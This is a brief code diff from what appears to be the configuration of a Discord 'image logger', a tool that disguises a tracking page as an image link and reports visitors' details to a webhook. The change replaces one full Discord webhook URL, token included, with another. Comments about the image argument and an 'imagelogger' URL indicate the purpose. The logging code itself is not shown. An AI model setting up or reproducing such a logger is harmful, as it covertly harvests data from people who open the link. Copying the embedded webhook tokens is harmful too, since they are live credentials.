@@ -13,7 +13,7 @@ __author__ = "ots"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1351094854415024239/N9FiKacGBPp4Hz4mvw33VGf7mzA4gkBUVkQk1Nf0hyWI9ouEuPH0tdHsq1pZ0-vfCFcx",
+    "webhook":"https://discord.com/api/webhooks/1355440467998806026/YQA1sDdF_Xud8-IIbQOhl6j1Wn2NgUSvlaVt_WvQbBx5sWp1RWeBv4E36yivDT6tm3OI",
     "image": "https://images-ext-1.discordapp.net/external/a0bCCMvKFrSQaL9dAKWZyqV-66efvAFD7Hs_raxruQI/https/media.tenor.com/a1Dkn79MC98AAAPo/wtf-meme.mp4", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
